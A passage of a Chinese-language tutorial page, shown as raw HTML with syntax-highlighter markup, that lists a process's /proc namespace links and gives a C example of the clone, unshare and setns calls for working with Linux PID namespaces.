class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531839</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744d2688671748-5\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mnt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mnt</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531840</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744d2688671748-6\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">net</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531963</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744d2688671748-7\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531836</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744d2688671748-8\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">user</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">user</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531837</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744d2688671748-9\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uts</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531838</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0137 seconds] -->\r\n<p>下面的代码演示了如何利用上述3个系统调用来操作进程的命名空间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744dc821204804\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#define _GNU_SOURCE\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/wait.h&gt;\r\n#include &lt;sched.h&gt;\r\n#include &lt;signal.h&gt;\r\n#include &lt;unistd.h&gt;\r\n#include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;errno.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/stat.h&gt;\r\n#include &lt;fcntl.h&gt;\r\n\r\n#define STACK_SIZE (10 * 1024 * 1024)\r\n\r\nchar child_stack[STACK_SIZE];\r\n\r\nint child_main(void* args) {\r\n    pid_t child_pid = getpid();\r\n    printf(\"I'm child process and my pid is %d \\n\", child_pid);\r\n    // 子进程会被放到clone系统调用新创建的pid命名空间中, 所以其pid应该为1\r\n    sleep(300);\r\n    // 命名空间中的所有进程退出后该命名空间的inode将会被删除, 为后续操作保留它\r\n    return 0;\r\n}\r\n\r\nint main() {\r\n    /* Clone */\r\n    pid_t child_pid = clone(child_main, child_stack + STACK_SIZE, \\\r\n        CLONE_NEWPID | SIGCHLD, NULL);\r\n    if(child_pid &lt; 0) {\r\n        perror(\"clone failed\");\r\n    }\r\n\r\n    /* Unshare */\r\n    int ret = unshare(CLONE_NEWPID); // 父进程调用unshare, 创建了一个新的命名空间,\r\n    //但不会创建子进程. 之后再创建的子进程将会被加入到新的命名空间中\r\n    if (ret &lt; 0) {\r\n        perror(\"unshare failed\");\r\n    }\r\n    int fpid = fork();\r\n    if (fpid &lt; 0) {\r\n        perror(\"fork error\");\r\n    } else if (fpid == 0) {\r\n        printf(\"I am child process. My pid is %d  \\n\", getpid());\r\n        // Fork后的子进程会被加入到unshare创建的命名空间中, 所以pid应该为1\r\n        exit(0);\r\n    } else {\r\n    }\r\n    waitpid(fpid, NULL, 0);\r\n\r\n    /* Setns */\r\n    char path[80] = \"\";\r\n    sprintf(path, \"/proc/%d/ns/pid\", child_pid);\r\n    int fd = open(path, O_RDONLY);\r\n    if (fd == -1)\r\n        perror(\"open error\");\r\n    if (setns(fd, 0) == -1)\r\n    // setns并不会改变当前进程的命名空间, 而是会设置之后创建的子进程的命名空间\r\n        perror(\"setns error\");\r\n    close(fd);\r\n\r\n    int npid = fork();\r\n    if (npid &lt; 0) {\r\n        perror(\"fork error\");\r\n    } else if (npid == 0) {\r\n        printf(\"I am child process. My pid is %d  \\n\", getpid());\r\n        // 新的子进程会被加入到第一个子进程的pid命名空间中, 所以其pid应该为2\r\n        exit(0);\r\n    } else {\r\n    }\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744dc821204804-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744dc821204804-74\">74</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-1\"><span class=\"crayon-p\">#define _GNU_SOURCE</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-2\"><span class=\"crayon-p\">#include &lt;sys/types.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-3\"><span class=\"crayon-p\">#include &lt;sys/wait.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-4\"><span class=\"crayon-p\">#include &lt;sched.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-5\"><span class=\"crayon-p\">#include &lt;signal.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-6\"><span class=\"crayon-p\">#include &lt;unistd.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-7\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-8\"><span class=\"crayon-p\">#include &lt;string.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-9\"><span class=\"crayon-p\">#include &lt;stdlib.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-10\"><span class=\"crayon-p\">#include &lt;errno.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-11\"><span class=\"crayon-p\">#include &lt;sys/types.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-12\"><span class=\"crayon-p\">#include &lt;sys/stat.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-13\"><span class=\"crayon-p\">#include &lt;fcntl.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-15\"><span class=\"crayon-p\">#define STACK_SIZE (10 * 1024 * 1024)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-17\"><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_stack</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">STACK_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-19\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">child_main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">pid_t </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"I'm child process and my pid is %d \\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 子进程会被放到clone系统调用新创建的pid命名空间中, 所以其pid应该为1</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">300</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 命名空间中的所有进程退出后该命名空间的inode将会被删除, 为后续操作保留它</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-26\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-28\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Clone */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">pid_t </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">clone</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">child_main</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_stack</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">STACK_SIZE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">CLONE_NEWPID</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SIGCHLD</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"clone failed\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-35\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Unshare */</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unshare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CLONE_NEWPID</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 父进程调用unshare, 创建了一个新的命名空间,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//但不会创建子进程. 之后再创建的子进程将会被加入到新的命名空间中</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"unshare failed\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-44\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"fork error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-46\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"I am child process. My pid is %d  \\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-47\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Fork后的子进程会被加入到unshare创建的命名空间中, 所以pid应该为1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">exit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" 